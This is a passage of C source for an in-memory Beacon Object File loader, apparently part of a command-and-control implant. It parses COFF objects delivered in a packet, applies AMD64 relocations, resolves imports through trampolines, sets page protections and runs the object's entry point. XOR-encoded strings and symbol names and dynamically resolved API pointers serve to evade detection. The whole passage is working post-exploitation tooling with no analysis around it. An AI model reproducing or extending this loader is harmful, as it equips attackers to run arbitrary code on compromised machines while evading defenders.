    case COFF_REL_AMD64_REL32_1:
    case COFF_REL_AMD64_REL32_2:
    case COFF_REL_AMD64_REL32_3:
    case COFF_REL_AMD64_REL32_4:
    case COFF_REL_AMD64_REL32_5:
        rel = (int64_t)target + *(int32_t *)patch -
              (int64_t)(location + 4 + (uint64_t)(type - COFF_REL_AMD64_REL32));
        if (rel < -2147483648LL || rel > 2147483647LL) return -1;
        *(int32_t *)patch = (int32_t)rel;
        return 0;
    default:
        return -1;
    }
}

static void free_sections_bof(bof_section_t *sections, uint16_t count) {
    uint16_t i;
    if (!sections) return;
    if (sections[0].allocation) {
        fnVirtualFree(sections[0].allocation, 0, MEM_RELEASE);
        return;
    }
    for (i = 0; i < count; i++) {
        if (sections[i].base) fnVirtualFree(sections[i].base, 0, MEM_RELEASE);
    }
}

static uint32_t align_page_bof(uint32_t v) {
    if (v > BOF_MAX_ALLOC - (BOF_PAGE_SIZE - 1U)) return 0;
    return (v + (BOF_PAGE_SIZE - 1U)) & ~(BOF_PAGE_SIZE - 1U);
}

static DWORD section_protect_bof(uint32_t characteristics) {
    int executable = (characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
    int writable = (characteristics & IMAGE_SCN_MEM_WRITE) != 0;

    if (executable) return writable ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ;
    if (writable) return PAGE_READWRITE;
    return PAGE_READONLY;
}

static int protect_loaded_image_bof(bof_section_t *sections,
                                    const coff_section_header_t *sh,
                                    uint16_t count,
                                    uint8_t *trampolines,
                                    uint32_t trampoline_size) {
    uint16_t i;
    DWORD old_protect;
    if (!fnVirtualProtect) return -1;
    for (i = 0; i < count; i++) {
        if (!sections[i].base || !sections[i].size) continue;
        if (!fnVirtualProtect(sections[i].base, sections[i].size,
                              section_protect_bof(sh[i].characteristics),
                              &old_protect)) {
            return -1;
        }
    }
    if (trampolines && trampoline_size) {
        if (!fnVirtualProtect(trampolines, trampoline_size,
                              PAGE_EXECUTE_READ, &old_protect)) {
            return -1;
        }
    }
    return 0;
}

void bof_free_result(bof_result_t *result) {
    if (!result) return;
    if (result->output) fnLocalFree(result->output);
    result->output = NULL;
    result->output_len = 0;
    result->exit_code = 0;
}

void bof_status_message(int status, char *out, int out_len) {
    const unsigned char *enc = ENC_BOF_ERR_RUN;
    int len = ENC_BOF_ERR_RUN_LEN;

    if (!out || out_len <= 0) return;
    out[0] = 0;
    switch (status) {
    case -1:
        enc = ENC_BOF_ERR_REQUEST;
        len = ENC_BOF_ERR_REQUEST_LEN;
        break;
    case -2:
        enc = ENC_BOF_ERR_COFF;
        len = ENC_BOF_ERR_COFF_LEN;
        break;
    case -3:
        enc = ENC_BOF_ERR_ALLOC;
        len = ENC_BOF_ERR_ALLOC_LEN;
        break;
    case -4:
        enc = ENC_BOF_ERR_SYMBOL;
        len = ENC_BOF_ERR_SYMBOL_LEN;
        break;
    case -5:
        enc = ENC_BOF_ERR_RELOC;
        len = ENC_BOF_ERR_RELOC_LEN;
        break;
    case -6:
        enc = ENC_BOF_ERR_GO;
        len = ENC_BOF_ERR_GO_LEN;
        break;
    }
    if (len >= out_len) len = out_len - 1;
    xor_dec(out, enc, len);
    out[len] = 0;
}

static uint32_t read_u32_bof(const uint8_t *p) {
    return (uint32_t)p[0]
        | ((uint32_t)p[1] << 8)
        | ((uint32_t)p[2] << 16)
        | ((uint32_t)p[3] << 24);
}

int bof_execute_packet(const uint8_t *data, uint32_t data_len, bof_result_t *result) {
    uint32_t obj_len;
    uint32_t args_len;
    uint32_t args_off;
    const uint8_t *args = NULL;

    if (!result) return -1;
    mem_zero_bof(result, sizeof(*result));
    if (!data || data_len < 8) return -1;
    obj_len = read_u32_bof(data);
    if (obj_len == 0 || obj_len > data_len - 4) return -2;
    args_off = 4 + obj_len;
    if (args_off + 4 > data_len) return -2;
    args_len = read_u32_bof(data + args_off);
    if (args_len > data_len - args_off - 4) return -2;
    if (args_len > 0) args = data + args_off + 4;

    return bof_execute(data + 4, obj_len, args, args_len, result);
}

int bof_execute(const uint8_t *obj, uint32_t obj_len,
                const uint8_t *args, uint32_t args_len,
                bof_result_t *result) {
    const coff_file_header_t *fh;
    const coff_section_header_t *sh;
    const coff_symbol_t *symbols;
    const char *strtab;
    uint32_t strtab_len;
    bof_section_t sections[BOF_MAX_SECTIONS];
    bof_context_t ctx;
    uint32_t section_sizes[BOF_MAX_SECTIONS];
    uint32_t section_offsets[BOF_MAX_SECTIONS];
    uint32_t total_size = 0;
    uint32_t import_area_size;
    uint32_t trampoline_area_size;
    uint32_t alloc_size;
    uint16_t i;
    uint32_t sym_i;
    uint32_t sym_bytes;
    uint8_t *image_base;
    void (*go_fn)(char *, int) = NULL;

    if (!obj || obj_len < sizeof(coff_file_header_t) || !result ||
        !fnVirtualAlloc || !fnVirtualFree || !fnVirtualProtect ||
        !fnLocalAlloc || !fnLocalFree) {
        return -1;
    }

    mem_zero_bof(result, sizeof(*result));
    mem_zero_bof(sections, sizeof(sections));
    mem_zero_bof(&ctx, sizeof(ctx));

    fh = (const coff_file_header_t *)obj;
    if (fh->machine != COFF_MACHINE_AMD64 ||
        fh->number_of_sections == 0 ||
        fh->number_of_sections > BOF_MAX_SECTIONS ||
        fh->size_of_optional_header != 0) {
        return -2;
    }

    if ((uint32_t)sizeof(coff_file_header_t) +
        ((uint32_t)fh->number_of_sections * sizeof(coff_section_header_t)) > obj_len) {
        return -2;
    }
    sh = (const coff_section_header_t *)(obj + sizeof(coff_file_header_t));

    if (fh->number_of_symbols > (obj_len / (uint32_t)sizeof(coff_symbol_t))) {
        return -2;
    }
    sym_bytes = fh->number_of_symbols * (uint32_t)sizeof(coff_symbol_t);
    if (fh->pointer_to_symbol_table == 0 ||
        fh->pointer_to_symbol_table > obj_len ||
        sym_bytes > obj_len - fh->pointer_to_symbol_table) {
        return -2;
    }
    symbols = (const coff_symbol_t *)(obj + fh->pointer_to_symbol_table);
    strtab = (const char *)(obj + fh->pointer_to_symbol_table + sym_bytes);
    if ((const uint8_t *)strtab + 4 > obj + obj_len) return -2;
    strtab_len = *(const uint32_t *)strtab;
    if (strtab_len < 4 || (const uint8_t *)strtab + strtab_len > obj + obj_len) return -2;

    for (i = 0; i < fh->number_of_sections; i++) {
        uint32_t size = sh[i].size_of_raw_data;
        if (sh[i].virtual_size > size) size = sh[i].virtual_size;
        if (size == 0) size = 1;
        size = align_page_bof(size);
        if (size == 0 || total_size > BOF_MAX_ALLOC - size) return -2;
        if (sh[i].pointer_to_raw_data && sh[i].size_of_raw_data) {
            if (sh[i].pointer_to_raw_data > obj_len ||
                sh[i].size_of_raw_data > obj_len - sh[i].pointer_to_raw_data) {
                return -2;
            }
        }
        section_offsets[i] = total_size;
        section_sizes[i] = size;
        total_size += size;
    }

    import_area_size = align_page_bof((uint32_t)(BOF_MAX_IMPORTS * sizeof(bof_import_slot_t)));
    trampoline_area_size = align_page_bof((uint32_t)(BOF_MAX_IMPORTS * BOF_TRAMPOLINE_SIZE));
    if (import_area_size == 0 || trampoline_area_size == 0) return -2;
    if (total_size > BOF_MAX_ALLOC - import_area_size) return -2;
    if (total_size + import_area_size > BOF_MAX_ALLOC - trampoline_area_size) return -2;
    alloc_size = total_size + import_area_size + trampoline_area_size;
    image_base = (uint8_t *)fnVirtualAlloc(NULL, alloc_size, MEM_COMMIT | MEM_RESERVE,
                                           PAGE_READWRITE);
    if (!image_base) return -3;
    sections[0].allocation = image_base;

    for (i = 0; i < fh->number_of_sections; i++) {
        sections[i].base = image_base + section_offsets[i];
        sections[i].size = section_sizes[i];
        if (sh[i].pointer_to_raw_data && sh[i].size_of_raw_data) {
            mem_copy_bof(sections[i].base, obj + sh[i].pointer_to_raw_data, sh[i].size_of_raw_data);
        }
    }

    ctx.result = result;
    ctx.imports = (bof_import_slot_t *)(image_base + total_size);
    ctx.trampolines = image_base + total_size + import_area_size;
    g_bof_ctx = &ctx;

    for (i = 0; i < fh->number_of_sections; i++) {
        const coff_relocation_t *relocs;
        uint16_t r;
        if (!sh[i].number_of_relocations) continue;
        if (sh[i].pointer_to_relocations > obj_len ||
            ((uint32_t)sh[i].number_of_relocations * sizeof(coff_relocation_t)) >
                obj_len - sh[i].pointer_to_relocations) {
            g_bof_ctx = NULL;
            free_sections_bof(sections, fh->number_of_sections);
            return -2;
        }
        relocs = (const coff_relocation_t *)(obj + sh[i].pointer_to_relocations);
        for (r = 0; r < sh[i].number_of_relocations; r++) {
            void *target;
            uint8_t *patch;
            uint32_t patch_size = relocs[r].type == COFF_REL_AMD64_ADDR64 ? 8U : 4U;
            if (relocs[r].virtual_address > sections[i].size ||
                patch_size > sections[i].size - relocs[r].virtual_address) {
                g_bof_ctx = NULL;
                free_sections_bof(sections, fh->number_of_sections);
                return -2;
            }
            target = resolve_symbol_bof(symbols, fh->number_of_symbols, strtab, strtab_len,
                                        sections, fh->number_of_sections,
                                        relocs[r].symbol_table_index);
            if (!target) {
                g_bof_ctx = NULL;
                free_sections_bof(sections, fh->number_of_sections);
                return -4;
            }
            patch = sections[i].base + relocs[r].virtual_address;
            if (apply_relocation_bof(patch, relocs[r].type, (uint64_t)target, (uint64_t)patch) != 0) {
                g_bof_ctx = NULL;
                free_sections_bof(sections, fh->number_of_sections);
                return -5;
            }
        }
    }

    for (sym_i = 0; sym_i < fh->number_of_symbols; sym_i++) {
        const char *name;
        char short_name[9];
        name = symbol_name_bof(&symbols[sym_i], strtab, strtab_len, short_name);
        if (name && symbol_eq_obf_bof(name, ENC_BOF_ENTRY_GO, ENC_BOF_ENTRY_GO_LEN)) {
            go_fn = (void (*)(char *, int))resolve_symbol_bof(symbols, fh->number_of_symbols,
                                                              strtab, strtab_len, sections,
                                                              fh->number_of_sections, sym_i);
            break;
        }
        sym_i += symbols[sym_i].number_of_aux_symbols;
    }
    if (!go_fn) {
        g_bof_ctx = NULL;
        free_sections_bof(sections, fh->number_of_sections);
        return -6;
    }

    if (protect_loaded_image_bof(sections, sh, fh->number_of_sections,
                                 ctx.trampolines, trampoline_area_size) != 0) {
        g_bof_ctx = NULL;
        free_sections_bof(sections, fh->number_of_sections);
        return -3;
    }

    go_fn((char *)args, (int)args_len);
    result->exit_code = 0;

    g_bof_ctx = NULL;
    free_sections_bof(sections, fh->number_of_sections);
    return 0;
}
